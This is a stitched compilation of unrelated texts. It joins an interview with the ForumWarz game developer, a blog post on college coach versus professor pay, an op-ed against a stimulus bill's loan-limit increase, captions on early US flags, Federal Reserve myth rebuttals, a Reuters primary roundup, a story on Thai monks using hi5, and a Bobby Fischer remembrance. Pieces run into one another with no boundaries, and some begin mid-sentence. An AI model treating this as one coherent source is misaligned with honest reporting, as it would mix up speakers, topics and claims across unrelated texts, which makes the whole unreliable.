Yes , that has always been a problem .
I would say 9 out of 10 people I ’d explain it to just had this glazed - over look on their faces .
I ’m quite neurotic , and during those first few months when I was developing it like mad in a black box , it would bother me a lot that I was working on something that people thought was a totally dumb idea .
When we launched in Beta though , I felt a lot better because it resounded so well with people .
It ’s really better off played than explained , that ’s why on the homepage we just want people to start playing right away .
Do n’t sign up , just click the big button .
Are there any other web - based games that are doing anything similar ?
I ’ve seen people mention Kingdom of Loathing as the closest cousin .
Kingdom of Loathing is the closest thing we have to a competitor , in that it is a web based parody game .
The interface and universe are quite different .
You know , ours is a little fake Internet , theirs is a fantasy world of stick figures .
I think they did a really good job establishing that there was a market for web - based RPG games .
Coming into the genre late , we had the advantage of new technologies like Rails and Ajax to create our interface .
Chatting with a character in sTalk , the fake instant messenger client Chatting with a character in sTalk , the fake instant messenger client
You ’ve also spent a lot of time developing strong NPCs to interact with , through the fake email and IM clients .
Yeah , I always loved conversation trees like in the old LucasArts games .
One of the first things I started prototyping was the sTalk interface , because I knew it was going to be important .
The interface is basically the same as the first version I came up with , but the tools for building the chats went through many iterations .
I actually wrote a more technical article about the back end for stalk a while ago on our forums if you ’re interested in peeking into it .
The characters sometimes parody archetypes ( obnoxious gamer , steroidal jerk , creepy pedophile ) and occasionally real people , like Boing Boing ’s Cory Doctorow as the pop culture / privacy - obsessed Doctor O .
Yes , we love parody , and fortunately there ’s a basically endless amount of things to parody on the Internet .
My favorite NPC so far is Fr4gGingR1teZ , the parody of Fatal1ty .
It was the last conversation Drach created for episode 1 and I think he ’d really gotten the hang of it .
Not only did he nail the parody , but he gave him some heart .
( Especially since he had no idea who Fatal1ty was when I suggested it . )
Clearly , not everyone ’s going to get every cultural reference .
The game ’s still enjoyable without it , but it just adds a deeper level of appreciation when you get the in - joke .
No way , I do n’t even get them all .
It ’s important that the casual player finds it funny , but the huge Internet nerd finds it hilarious .
I mentioned in that Digital Journal article you linked to that I love Futurama , and it ’s great for that .
They even have a name for it , something like the 1 % joke , where only 1 % of the audience gets it .
I was disturbed that I knew 20 out of the 21 memes mentioned during the signup process .
( Everything but Rabbit - Chan . )
Ah , Rabbit - Chan is quite obscure .
I ’m kind of obsessed with Internet culture .
Things like Rabbit - Chan fascinate me , because it ’s the kind of thing that just could n’t exist anywhere else .
She ’s a teenage girl who posted some pictures on 4 chan , and they became super obsessed with her .
She became a “ meme , ” in particular how people claimed to be in love with her , how every minute of every day they thought about her and had no idea how to cope .
What ’s weird though is hundreds of teenage girls have posted their pictures on 4 chan , and yet she ’s the only one who got that kind of treatment .
It seems that popularity can be quite random .
Players can choose to be an emo kid , troll , or camwhore Players can choose to be an emo kid , troll , or camwhore
Speaking of the meme list , I was struck by the signup and tutorial process .
Very intuitive , and you can play for 15 minutes before even setting a password .
How did that come about ?
Thanks , we spent a LOT of time on it .
It goes hand in hand with what I said earlier about the idea behind ForumWarz being a tough sell .
Joel Spolsky talked about barriers to entry , and it always stuck with me .
Like the fewer barriers to entry you have , the more people you ’re likely to reach .
So I brought that up with the guys , and I was like , screw signing up !
Let ’s let them play right away .
By the time we require them to sign up , they ’ll know whether it ’s the kind of thing they ’ll enjoy .
The other thing was the choice of a quiz .
Originally it was going to be used to choose your class , like in other RPGs , but soon after we started writing it we realized the whole tutorial would be a lot simpler if you just had a couple of attacks , hence the Jimmy the Re- Re character was born .
We thought it was hilarious that no matter what you answered in the quiz you always received the same class .
As it turns out , that was a bad call .
We ’ve received many complaints about that , some people have even left the site because they ’re like , “ Screw this , I wanted to be a troll ! ”
I noticed many people get fooled by that , including some friends of mine .
I thought it was obvious that everybody rolled the same character .
Especially since when you click “ No , ” it says , “ How can I say this nicely — I REALLY think you ’re a Re- Re . ”
We ’ve changed that message to say “ Do n’t freak out , you can choose your class later , buddy . ”
Do n’t feel bad , everyone who freaked out was a re-re .
[ laughs ]
Well , websites are neat in that we can change them and screw around with them at any time .
We keep a lot of statistics on how many people left , and at what stage .
So even though it was a mistake , we will come up with a smoother version of the same joke .
It just might take a few tries before we get it right .
The game does an amazing job of teasing you further into gameplay , never leaving you confused about what to do next .
Yeah , I wanted to make sure we held their hand all the way into it .
A lot of console and PC games are great at that , but few web games bother .
Like I said before , “ Read the wiki ” is a terrible intro .
We knew we could do better .
The Facebook - style news feed reminds you who you ’ve met , your goals , and other recent activity The Facebook - style news feed reminds you who you ’ve met , your goals , and other recent activity
In Portal , they do a great job of training the player , helping them build a mental model of the game universe one piece at a time .
As I played it , I was trying to think how that kind of effortless training would work on the web …
When I first played ForumWarz , my immediate thought was that you ’d figured it out .
Every Web 2.0 startup could learn something from the first 10 minutes of ForumWarz .
Thank you , that ’s very flattering .
I ’m a huge fan of Portal , and Valve ’s work in general .
Immediately after finishing Portal I started it again with the commentary , and I was like , oh , if only we had the resources to develop with constant testing and feedback .
You did three months of playtesting .
Did you ever physically sit behind players to see where they got stuck ?
Or was it all watching the stats and reading the feedback ?
I never once sat behind someone ’s back , it was all based on emails and forum discussions , which is n’t the ideal way to do it .
How much did ForumWarz change in that beta period ?
In terms of the intro , it ’s almost exactly the same as what we went into beta with .
If anyone tested that extensively , it was us .
During the beta , the game improved tremendously .
We had a lot of little nuisances that we took out .
Some things that come to mind are allowing people to carry forum visits over days they do n’t play , only counting a visit upon their first attack .
We did notice that people seemed to love the game , played through episode 1 in a week or two , then dropped off .
So instead of going right into episode 2 , we made the conscious decision to work on aspects of the game for people who had already finished it , hence ForumBuildr and Domination were born .
I mean that ’s still our major flaw , in that you can get through all we have to offer fairly quickly , but it ’s better than it was before .
ForumBuildr lets players write and design new levels , and vote for the best ones ForumBuildr lets players write and design new levels , and vote for the best ones
ForumBuildr is one of the most innovative elements of ForumWarz , allowing users to write and design new levels and vote the best ones into production .
It really playing off the strengths of the web and could n’t be done in any other medium .
I developed the “ madlib ” engine fairly early on , so that we could generate random postings on the forums .
Then we ’d have sessions where a bunch of us would sit around in a room with laptops , generating the posts for a particular forum , and it was quite fun .
I think it was Drach who suggested initially that we give players the ability to use the tool .
At first I was against it , but I think it ’s because I did n’t really understand how we would give it to them .
Then early in beta , someone posted a thread saying it would be cool if they could write their own posts , and Drach replied saying we ’d been thinking of a voting system for that , and all sorts of people were like , wow that sounds awesome .
So we pushed it to the front .
I spent a week making the tool more user friendly , maybe another week adding the Digg - style voting controls and we threw it to them .
I was quite happy with how well it went over , even with our limited user base at the time .
The user - generated levels are playable from the ForumBuildr section , but not part of the story …
Are you going to introduce the user - created threads into the next episode ?
For Episode 2 , we ’ve already created some forums and will create more , but our users are now creating material much faster than we are .
We have plans to integrate their forums into our storyline , as well as a generic mission system that can come up with random missions every day with a specific reward .
Those forums will be very useful for that .
In the meantime , anyone can play the community - created forums .
They can even be used for levelling up , although getting to them [ through ForumBuildr ] is a little odd .
Sometime soon I plan to redo the forum list page , to add things like sorting .
I ’ll be listing them along with the Episode 1 forums …
I think it will make the Internet feel less empty .
( The fake internet , that is . )
The real ForumWarz forums are just as strange , with people role - playing their characters .
[ laughs ]
Yes , that was something that surprised us .
It came out the very first day of beta .
In the “ Whiny Bitches ” forum , people started posting as their characters and enjoying it , and then someone suggested I give them their own forum to roleplay in , and it took off like crazy .
They can be hilarious at times .
I think smart people love to pretend that they ’re stupid .
But occasionally they take it too far and bring it into other forums and stuff , which has to be cleaned up .
You hear these stories of people developing software , then being completely surprised when their users use it in a way that was n’t intended .
Our RPG
Forums are that for me .
We ’ll totally enable them to do that , and I ’m glad they enjoy it .
I noticed there was some vandalism on the wiki , with people removing core documentation pages .
Do you think people are getting too carried away with pretending to be retarded trolls ?
Or were they actually retarded trolls ?
Hah , I ’m not sure .
We ’ve banned a couple , and hopefully we can stay on top of it .
I think we might need to add some moderator support soon .
I put a note in the edit screen for the wiki that says “ If you vandalize this , you will be banned . ”
Hopefully that will scare some people off .
Good move .
So , let ’s talk a little about cash money .
You ’ve decided to go with paid upgrades but with a couple novel twists , allowing players to cheat extensively , buy new characters , or screw around with other players anonymously .
How did you decide on what your brownie points can buy ?
A lot of it was stolen shamefully from the Something Awful forums , in terms of being able to buy avatars and prank people .
New characters just made sense because people often wanted to play the game as another class to see the difference .
For a few bucks , cheat your way to the top with “ Illegal Game Enhancements ”
For a few bucks , cheat your way to the top with “ Illegal Game Enhancements ”
How about the cheats ?
They ’re extremely powerful .
( Instantly killing a thread , virtually unlimited money , and no forum limits . )
The cheats are a relatively new idea .
People often complain about the forum visit limit when they first start playing , because we suck them in for an hour or two of gameplay , then bam , they have to stop and come back tomorrow .
So people had been asking if there was any way to buy visits for a while , and we always said no because it screwed with the competitive aspect of the game .
But then i was thinking about it , and realized there ’s probably a lot of players who do n’t care much about competition , who just want to breeze through the story .
So I coded up a way to flag accounts as cheated , and disqualify them from leaderboards and Domination .
It ’s been really successful .
I had no idea how many people just wanted to get on with the game .
And you ’re also running ads , which can be disabled if you donate .
Anything other revenue models I ’m missing ?
Nope , that ’s it so far .
It ’s likely that Episode 2 will require some kind of payment to play , but we have n’t fully sorted that out yet .
And the idea of selling t- shirts or posters has been thrown around , but both of those concepts are up in the air right now .
How ’s it growing since the public launch two weeks ago ?
Actually , first off , I should thank you for your link , speaking of growth .
You , and the Wired article that followed , sent us a huge amount of users .
You ’re welcome !
Glad to help .
Growth has been great since we launched .
The beta had about 1,200 accounts , but by the end only about 150 - 200 were active .
Right now we ’re closing in on 10 k accounts , which is pretty good for a few weeks .
The days following your link and Wired , we signed up over 1,000 each day .
I have no idea how high we can take that number .
I have read that Kingdom of Loathing has 100k members , but they ’ve been around since 2003 .
We typically have about 2500 - 3000 accounts active in a given day .
I ’m very happy with the response , although I do n’t have much to compare it to .
I know of a local venture that had a team of 10 working on a social networking site for a year , and after 3 months were celebrating their 1000th user .
Now that the framework ’s in place , how long do you think it will take to release new episodes ?
Because the framework is in place , the other episodes should be easier to develop , but we ’re also being ambitious about it .
We want to add new ways to play that complement the existing game .
Having said that , we really need to get moving on episode 2 .
I ’d planned to be working at it much harder than I am right now but the sudden business of the site has meant a lot of work staying on top of bugs and stuff .
Drach is going to take some vacation time soon to help out again , which helped tremendously last time .
What would it take for the site to be self - sustaining and for Drach to leave his job to work full time on it ?
I ca n’t speak for him , but I ’d guess it would require some regular income .
The current influx of users and income is great , but who knows how long it will last ?
As a developer , I did n’t feel the risk of quitting my day job was a huge one , as the market for developers seems to be pretty good .
As a writer , it ’s much harder to find gigs .
I ’d think if we showed steady income over a period of months he ’d be willing to do it .
Wrapping up , I want to talk a little about the technology .
You ’ve built it all on Rails , and the site is snappy as hell .
Any concerns about scaling ?
I have no doubt that Ruby is slow , but I tried to design the site in the best way I could , and so far I ’ve been really happy with the performance .
I ’ve been doing web development for years , and I spent about 5 years doing J2EE stuff , and let me tell you I could never go back .
I just feel so much faster in Rails , and I think that ’s worth the performance loss .
You know what they say , servers are cheap , programmer time is expensive
I think scalability is a problem you constantly have to face , no matter what technology you use .
We ’ve had some bumps and I think there will continue to be them in the future , but I feel confident that they can be surpassed .
How ’s the Haml templating engine been to work with ?
It looks elegant , but I ’ve never tried it .
Haml is a great product .
I should let you know that I know the creator personally , he lives around the corner from me and he ’s well known in the local Rails community .
It is not perfect for all situations .
I have the odd page that uses ERB for formatting , but for 90 % of the pages I write it makes me faster , simply because I do n’t have to close tags .
I should point out that we ’re running everything off one server now ( rails , memcached and mysql ) , so we have n’t even begun buying additional hardware yet .
Up until thursday night we were running on 1GB of RAM too , but that was n’t enough so we added another GB .
I saw on Netcraft you ’re using nginx ?
Yes , I use nginx as a proxy to a pack of mongrels .
There are many different ways to configure a Rails stack , I ’m not sure how I decided on that one , really .
It just kind of turned out that way .
I read a lot of blogs and stuff .
I ’m no huge IT person , and it seemed within my limits to configure it .
I read a blog entry that benchmarked nginx against mongrel and lighttpd , and nginx / mongrel came out on top .
I think I read a few benchmarks like that , yes .
I remember reading that Apache2 and FastCGI was the fastest configuration , but that it ate a lot of RAM .
And since our hosting company charges a fair bit for RAM , I went with nginx .
I wanted to ask about The Unintelligencer , the text parser you built that simulates progressively stupider commenters .
Are you unintelligencing user - contributed text in ForumBuildr ?
Or only the stuff you wrote ?
We do a little .
It can be tuned with various percentages , but since we want people to quickly recognize what they wrote , it ’s very low on their submissions .
We could probably tune the actual game back some too .
Right now , some of the text is so mangled it feels greeked .
( Lorum ipsum d0l0rr . )
Yeah , it was meant to be very occasional , but I think we took it too far .
I think it works as placeholder text .
If the fake comments were more coherent , I ’d start reading them as conversation expecting to see replies .
Yeah , and unfortunately we ca n’t do that .
Some people have suggested we take it further , create Markov - chain based replies to your attacks and stuff .
I liked that suggestion , but now I ’m in that sucky period where everything awesome just reeks of TIME , and I have to just pick and choose the ideas .
You ’ve built an extremely solid foundation and a brilliant first episode .
I think it ’ll be a big success .
Thank you , Robin !
Thanks again .
It really took an enormous amount of effort to get to this point , a lot of it without any feedback at all , so it means a lot to me ( and the team ) every time someone has something nice to say about it .

to acompensation database for college football coaches , and here is a link to the latest AAUP report on faculty salaries ( see Table 4 ) .
Questions : 1 . Where 's the outrage about this from college students ?
College students around the country often protest about the " unfairness " of low wages in foreign " sweatshops " making university apparel .
Should n't they be protesting the " unfairness " of " excessive " football coach pay and relatively low ( " sweatshop " ? ) wages for college professors ?
After all , the universities that the students attend pay their college professors withless than 10 % of what they are paying the football coaches ( see chart above ) .
2.spokesman R.said
“ Workers are rightfully outraged when they learn about jaw - dropping executive compensation packages .
It ’s time to put the brakes on runaway CEO pay .
” Where 's the outrage among UAW workers and taxpayers in states like Michigan where college football coaches at UM andmake $ 1 million to $ 1.5 million per year ?
Is n't it time to " put the brakes on runaway college football coach pay ?
" 3 .
Is n't rising compensation for college football coaches a perfect example of the rising income inequality over time that generates so much outrage ?
Certainly the gap in salaries between college coaches and college professors has risen over time , just as the gap in salaries between college professors and college secretaries has probably risen over time .
An historical analysis would probably show an increasing share of total university payrolls going to the football and basketball coaches , or to the highest paid 1 % , 5 % , or 10 % of university personnel ( including presidents and deans ) .
If the general public can understand that market forces ultimately determine the compensation of college football coaches , perhaps they can understand that market forces also determine CEO salaries ; and since the salaries of both are rising over time , perhaps they can understand that rising income inequality is the natural and expected outcome of an increasingly competitive marketplace , which increasingly rewards scarce talent ?
One can always be hopeful .
Opinion
STIMULUS PLAN A SCAM TO BENEFIT THE RICH
Higher loan limits will lead to Fannie Mae , Freddie Mac bailout
Congress is about to sell us the biggest fraud in American history .
It 's been highly touted as an economic stimulus bill that will help millions of Americans - and has the backing of both President Bush and House Speaker Nancy Pelosi .
In the coming year , individuals would receive rebates of up to $ 600 and families up to $ 1,200 .
There are other goodies , too , including tax write - offs for small businesses and an expansion of the child tax credit .
But , as the old adage goes , nothing comes for free .
As part of the bill , Congress is set to rush through an increase in the mortgage loan limits for Fannie Mae and Freddie Mac ( and Federal Housing Administration insurance , too ) - from $ 417,000 to $ 729,750 - the first step toward a massive financial disaster in which taxpayers will end up paying through the nose .
Here 's how we got to this point .
Domestic and international investors hold hundreds of billions of dollars in bad debt , because U.S. investment houses sold them junk securities based on often fraudulent mortgages .
Many of these mortgages were sold to unqualified buyers under terms that made widespread foreclosures a certainty once the housing market began to fall .
Investment banks and bond rating agencies sat down and tried to figure out how to describe Americans with insufficient incomes and little for a down payment as great credit risks on loans too big for their incomes .
The new rules focused on credit scores , because it was a good excuse to avoid looking at income and down payment , factors that would have restricted this moneymaking fiasco .
Now , thanks to Congress , junk bond investors will be able to pawn off their bad debt to Fannie and Freddie , instead of suing the big investment houses for ripping them off .
This shift will certainly doom Fannie Mae and Freddie Mac , so do n't be surprised if we , the taxpayers , have to bail out poor Fannie and Freddie - to the tune of more than $ 1 trillion .
Why more than $ 1 trillion ?
If Goldman Sachs is correct in its recent projections that home prices in California are going to drop 35 to 40 percent , the state 's losses alone would top $ 2 trillion , because California has a disproportionate number of jumbo loans .
The irony here is that the collapse in housing prices could make Fannie insolvent even without raising the loan limit .
Increasing Fannie 's limit is like going on a spending spree with your credit cards because you know you are going to file for bankruptcy in a few months .
Only here the taxpayer is left holding the bag .
Our children will pay interest on this debt in perpetuity .
It is our debt .
It is inescapable .
In the coming months , Fannie and Freddie will buy up mortgages based on old , fraudulent appraisals and on loans with bogus inflated incomes .
Unfortunately , many of these loans will still default .
But that 's just the start .
Brace yourself for another wave of faxes , phone calls and junk mail urging you to refinance at only 1 percent .
With zero new regulation , the same bad actors that caused this crisis can once again inflate property appraisals and begin a new cycle of fraud .
There are firms that rent assets to people to help them fraudulently qualify for a mortgage - like loaning them money to keep in their bank account for a couple months so they can fool the lender with documented savings that evaporate the day after the mortgage is signed .
Another popular ruse :
The borrower pays an employer to pay him a lot of money in a fake job for a month or two so he can show a fat paycheck in his loan docs .
Some real estate agents and mortgage brokers actually refer buyers to these services .
Contrary to popular myth , Fannie holds a lot of subprime debt , option ARM debt and other dodgy securities .
Fannie and Freddie owned or guaranteed almost 45 percent of all mortgages in America last year .
BusinessWeek noted in 2007 that Fannie and Freddie have " moved more prominently into low - documentation loans , which require little or no proof of the borrower 's income . "
Expansion of Fannie and Freddie 's reckless lending is exactly what Congress wants because it 's plausibly deniable .
Teary - eyed lawmakers can take to the airwaves a year from now and declare : " We had no idea Fannie could go under , but we can't cut and run now .
We have to bail out Fannie and Freddie for the good of America !
It 's going to be a tough slog , but you 're getting used to those , no ? "
Those same lawmakers wo n't mention the fact that they get paid far more by real estate lobbyists than they do from our Treasury .
I 've spoken with borrowers who stopped making mortgage payments seven or more months ago .
None has received a default notice .
Defaults may be much higher than banks are letting on .
The data lags are growing suspiciously long .
Nobody knows what 's going on .
Seven months without making a single payment !
Will Fannie guarantee those loans because they are n't in formal default yet ?
Nobody wants to know , because if they know , they might be called to testify next year .
That 's why lawmakers want to raise the limits now and ask questions later .
This shortsighted plan poses a terrible risk to every American taxpayer , especially retirees , because Social Security money will be needed to bail out Fannie and Freddie .
And even if you live in high - priced San Francisco , Los Angeles or New York - and stand to benefit from the increased loan limit - this is a horrible fraud on you , too , because raising the limit to $ 730,000 risks a systemic crisis that will cost far more than any temporary rebate check .
In support of the economic stimulus bill , Bush will have to face " working American families " and explain that some of their tax money is going to be spent guaranteeing $ 730,000 mortgages on $ 1 million homes .
It 's like some sort of upside - down communism where the poor pay the rich welfare .
Why should taxes from families earning $ 48,000 a year be used to support expensive mortgages in New York , Los Angeles and San Francisco ?
Welfare for the hungry and homeless is evil , but welfare for million - dollar homeowners facing a tough refi ... well , that 's called " helping the economy . "
I can imagine the president 's radio address playing in the heartland : " We have some families with million - dollar homes on the coasts who are really hurting and so we need you , the working families of America , to stand together with them and help them avoid the kind of home price depreciation that might leave them without a new Lexus for years . "
I guess Congress ' hope is that median - income families will be too busy using their rebates to buy much - needed groceries to notice that the rich folk are getting way with a new scam .
Several months ago , economist Nouriel Roubini of New York University 's Stern School of Business suggested that the housing market has been effectively nationalized .
At first it seemed crazy , but now it 's fairly obvious .
In August alone , Fannie and Freddie increased their loan portfolios by $ 62 billion , and the Federal Home Loan Bank by $ 110 billion .
That total of $ 172 billion would come to just over $ 2 trillion annually - not much less than the entire federal budget .
Everyone seeking a loan , securitizing a mortgage , and buying or selling a mortgage security will now be dealing , in one way or another , with the U.S. government .
This type of intervention is very expensive and will eat everything in its path , including Social Security .
If we 're going to have a government - financed intervention , it should be to make sure that Social Security benefits go to those who paid for them , that the poor are fed and housed , or that the army of uninsured receive health benefits .
If , as they say , we do n't have enough money for those important things , then I think we do n't have enough money to bail out banks and bond investors .
Do n't let me down , my fellow Americans .
Let 's vote out anyone0 who dares to vote for this scam .
American ships in New England waters flew a " Liberty Tree " flag in 1775 .
It shows a green pine tree on a white background , with the words , " An Appeal to Heaven . "
The Continental Navy used this flag , with the warning , " Do n't Tread on Me , " upon its inception .
The " Grand Union " shown here is also called The " Cambridge Flag . "
It was flown over Prospect Hill , overlooking Boston , January 1 , 1776 .
In the canton ( the square in the corner ) are the crosses of Saint Andrew and Saint George , borrowed from the British flag .
The " Betsy Ross " flag .
The Flag Resolution did not specify the arrangement of the stars nor the specific proportions of the flag .
So many 13 - star flags were used , as seen from the next several pictures .
Another 13 - star flag , in the 3 - 2 - 3 - 2 - 3 pattern .
The Guilford Flag .
The Serapis Flag .
The Serapis Flag .
According to some accounts , two famous flags were flown at the Battle of Bennington .
One , shown here , is called the Bennington Flag or the Fillmore Flag .
The story goes that Nathaniel Fillmore took this flag home from the battlefield , and the flag was passed down through generations of Fillmores , including Millard , and today it can be seen at Vermont 's Bennington Museum .
Most experts doubt this story and date the flag to about 1820 .
The other ( not pictured ) has a green field and a blue canton with 13 gold - painted stars arranged in rows .
General John Stark gave his New Hampshire troops a rallying speech that would be the envy of any football coach today .
He said , " My men , yonder are the Hessians .
They were brought for seven pounds and ten pence a man .
Are you worth more ?
Prove it .
Tonight , the American flag floats from yonder hill or Molly Stark sleeps a widow ! "
Cowpens Flag .
According to some sources , this flag was first used in 1777 .
It was used by the Third Maryland Regiment .
There was no official pattern for how the stars were to be arranged .
The flag was carried at the Battle of Cowpens , which took place on January 17 , 1781 , in South Carolina .
The actual flag from that battle hangs in the Maryland State House .
Vermont and Kentucky joined the union in 1791 and 1792 .
This flag with 15 stars and 15 stripes , was adopted by a Congressional act of 1794 .
The flag became effective May 1 , 1795 .
By 1818 , the union consisted of 20 states .
A Congressional act mandated that the number of stripes be fixed at 13 and that one new star was to be added for each new state , the July 4 following its admission .
However , nothing was written about what arrangement the stars should be in .
This and the following two flags were all used simultaneously .
Another 1818 flag ( see above ) .
And another 1818 flag ( see above ) .
This was called the " Grand Star " flag .

Facts :
Yes , the Federal Reserve banks are privately owned , but they are controlled by the publically - appointed Board of Governors .
The Federal Reserve banks merely execute the monetary policy choices made by the Board .
In addition , nearly all the interest the Federal Reserve collects on government bonds is rebated to the Treasury each year , so the government does not pay any net interest to the Fed .
Facts :
No foreigners own any part of the Fed .
Each Federal Reserve bank is owned exclusively by the participating commercial banks and S&Ls operating within the Federal Reserve bank 's district .
Individuals and non -bank firms , be they foreign or domestic , are not permitted by law to own any shares of a Federal Reserve bank .
Moreover , monetary policy is controlled by the publically - appointed Board of Governors , not by the Federal Reserve banks .
Fact : Independent accounting firms conduct full financial audits of the Federal Reserve banks and the Board of Governors every year .
The Fed is also subject to certain types of audits from the Government Accounting Office .
Facts : The Federal Reserve rebates its net earnings to the Treasury every year .
Consequently , the interest the Treasury pays to the Fed is returned , so the money borrowed from the Fed has no net interest obligation for the Treasury .
The government could print its own currency independent of the Fed , but there would be no effective safeguards against abuse of this power for political gain .
Facts :
The Federal Reserve banks have only a small share of the total national debt ( about 7 % ) .
Therefore , only a small share of the interest on the debt goes to the Fed .
Regardless , the Fed rebates that interest to the Treasury every year , so the debt held by the Fed carries no net interest obligation for the government .
In addition , it is Congress , not the Federal Reserve , who is responsible for the federal budget and the national debt .
Facts : Kennedy wrote E.O. 11,110 to phase out silver certificate currency , not to issue more of it .
Records show Kennedy and the Federal Reserve were almost always in agreement on policy matters .
He even signed legislation to give the Fed more authority to issue currency .
Facts : McFadden was incorrect regarding the Fed costing the government money .
However , later economic analysis agrees with him that Federal Reserve policy blunders had a substantial role in causing the Depression .
However , his implication that this was done deliberately has no basis in fact .
Moreover , for a dozen years prior to his rant , McFadden had been the chairman of the House subcommittee that oversaw the Federal Reserve .
Why did n't he do anything to reform or abolish the Fed while he had the chance ?
Facts :
The banking system is indeed able to create money with a mere computer keystroke .
However , a bank 's ability to create money is tied directly to the amount of reserves customers have deposited there .
A bank must pay a competitive interest rate on those deposits to keep them from leaving to other banks .
This interest expense alone is a substantial portion of a bank 's operating costs and is de facto proof a bank cannot costlessly create money .
Fact :
The term ' lawful money ' does not refer to gold or silver coin , but to types of money which the government would permit banks to use when tabulating their reserves .
These types of money included , but were not limited to , gold and silver coin .

( Reuters ) - Democrat Hillary Clinton faces two crucial and potentially “ must - win ” showdowns with presidential rival Barack Obama in Ohio and Texas on Tuesday .
Here are some views on Clinton ’s challenges and her options if she fails to win both states with big enough margins to cut into Obama ’s current lead in pledged delegates , who will choose the Democratic nominee in November ’s election .
BARACK OBAMA , Illinois senator and candidate , in ABC interview .
“ If we do well in Texas and Ohio , I think the math is such where it ’s going to be hard for her to win the nomination .
And they ’ll have to make a decision about how much longer they want to pursue it . ”
CAL JILLSON , a political scientist at Southern Methodist University in Dallas .
“ There will be people in her campaign who will argue a split decision is good enough to continue .
But as a practical matter , just looking at the delegates , the numbers wo n’t really add up for her . ”
BILL RICHARDSON , governor of New Mexico who dropped his presidential bid in January , on CBS ’ “ Face the Nation . ”
“ We have to have a positive campaign after Tuesday .
Whoever has the most delegates after Tuesday , a clear lead , should be , in my judgment , the nominee . ”
MARK PENN , Clinton strategist .
“ This has been a roller - coaster race , and every time people try to foreclose it the voters come back and say , ‘ Just wait a minute here ; we want to have our say . ’
Let ’s see what the voters say , let ’s take a look at what the situation looks like on Wednesday , and I think it will be pretty clear . ”
HOWARD WOLFSON , Clinton spokesman
“ We are very optimistic about our chance of success in Ohio and Texas .
If the outcome is different we can talk about it then . ”
FORMER PRESIDENT BILL CLINTON , Clinton ’s husband , speaking at a Texas rally
“ If she wins Texas and Ohio I think she will be the nominee .
If you do n’t deliver for her , I do n’t think she can be .
It ’s all on you . ”

BANGKOK , Thailand 
The Thai government said Tuesday it was investigating claims that supposedly celibate Buddhist monks have been using a U.S. - based social networking website to flirt with women .
" We are looking for a way to monitor the use of the website by monks , " said Chakrapob Penkair , a minister attached to the Prime Minister 's Office .
The controversy arose after a self - styled watchdog group — the Network of Civilians to Protect the Nation , the Religion and the King — said monks were using the social networking site hi5 to flirt with women .
One user who called himself " Monk Chat " sent a message to a woman that said " ( I ) miss you , " reported Thai Rath , Thailand 's top - selling newspaper .
Buddhist monks must abstain from sexual behavior , which in practice means avoiding almost any contact with women .
About 90 % of Thailand 's 65 million people are Buddhist .
Thai society expects most Buddhist males to spend at least two weeks in the monkhood during their lives to show their devotion to the religion .
While most monks live by the religion 's strict tenets , occasionally some flout the bans on sex or drinking .
Phone calls seeking comment to Bangkok's Mahachulalongkornrajavidyalaya
University , the country 's leading Buddhist training institute , were not answered Tuesday .
Charkapob urged other Thai Web users to look out for monks conducting themselves in an unseemly manner online .
" We urge people who use the site to tell monks to leave , " Chakrapob said .
" Other users need to show them that it is inappropriate for monks to chat with women online . "
Last year , the Thai government blocked access to the YouTube video site for several months in a dispute about content deemed insulting to Thai King Bhumibol Adulyadej .
When asked about the possibility of blocking hi5 , Chakrapob said the government needed to thoroughly consider its options because " the site is used as a database for many people and can be useful for many purposes . "
The operators of California - based hi5 claim it is the No. 1 social networking site in more than 15 countries , including Thailand .
A call to the hi5 public relations office in San Francisco was not answered early Tuesday .
A senior Culture Ministry official , Ladda Thangsupachai , said monks should not be banned from using the Internet because they can use it to teach Buddhist philosophy to the young .
" Cyberspace can be very useful for monks , " Ladda said .
" But it 's wrong to use it to pick up girls . "

Among this year ’s worst news , for me , was the death of Bobby Fischer .
Telling a friend this , I got , “ Are you out of your bloody mind ?
He was a Nazi- praising raving lunatic and anti-Semite .
Death is too good for him . ”
He did , indeed , become all that .
But none of it describes the man I knew .
Towering genius , riches , international fame and a far from normal childhood might be too heady a mix for anyone to handle .
For him they proved fatal .
I ’m still sad about his death .
In our three encounters on my late - night show , I became quite fond of him .
Video
Viewing the tapes of those memorable appearances , a licensed professional in the field of psychiatry might see foreshadowings of the savage illness that eventually engulfed him .
I did n’t .
Some years back , the writer Rene Chun was working on a book about Fischer , and confessed to being unprepared for the maddening — and maddened — thing that the poor man had become .
Getting low on advance money , and having learned that Fischer had been on my show several times , Chun asked if there were any way he could see these “ invaluable documents — short of unaffordable fees . ”
I sent them to him .
He had written me about a still picture he ’d found :
Thought you might like to see this photo .
When I came across it recently , I was struck by the warmth it transmits to the viewer .
Both of you look like you are having a fabulous time .
Studying the photo it ’s obvious that these two men genuinely like each other .
Fischer is clearly comfortable with you .
If you screen Fischer ’s Tonight Show appearance , which aired shortly after his ’ 72 victory , the enigmatic chess champ comes off well , but does n’t look nearly as comfortable or spontaneous during the course of 15 minutes as he does here in a single frame .
Of course , this is just an isolated image .
One would have to see the entire show to make a judgment .
But I suspect that the Fischer in your interviews is a Fischer we have n’t seen before .
The famous 60 Minutes piece that aired just before the ’ 72 match depicts a totally different Fischer — anxious , guarded , serious as hell . …
You were lucky enough to be the only media person that Fischer seemed to be completely at ease with .
Taping not one , but several interviews with you speaks volumes about your character and integrity .
[ I ’ll be the judge of that .
— D.C. ]
Fischer could smell a show biz phony in an instant … .
*********************
It must seem strange to people too young to remember that there was once a chess champion — of all things — who became arguably the most famous celebrity on earth .
And that his long - anticipated match against the reigning Russian champion , Boris Spassky , was broadcast and watched worldwide as if it were the Super Bowl , except that chess drew a much bigger audience .
There was another element that added to the drama .
With Fischer the American and Spassky the Russkie , the monumental match was seen as a Cold War battle .
The Russian chess champions considered themselves the undoubted best .
Time out of mind the Soviet chess dynasty had reigned supreme , viewing themselves as a rightful symbol of Soviet superiority in all fields .
PBS broadcast the drama in sports fashion , complete with play - by - play commentary by Shelby Lyman , who himself became a household name .
People stayed home from work , glued to their sets , and PBS got its highest ratings ever .
The country and the world became chess -crazy .
And Fischer - crazy .
Chess sets , dusty on the shelves , suddenly sold in the millions .
We ordinary mortals can only try to imagine what it might feel like to be both young and so greatly gifted at a complex art .
And to be better at it than any other living being , past or present .
There are plenty of geniuses and lots of famous people , but few are both .
Is anyone really capable of surviving such a double burden ?
We assume that geniuses are blessed creatures who do n’t have to work hard to achieve their goals .
Hard for us , easy for them .
But Bobby as a kid — IQ pushing 200 — put in 10 to 15 hours a day of brain power and heavy concentration that would kill an ordinary person .
( Or at least me . )
The chess world was already well aware of this kid prodigy .
But they were unprepared for him to suddenly go up against the acknowledged top player of the day in the United States Chess Championship .
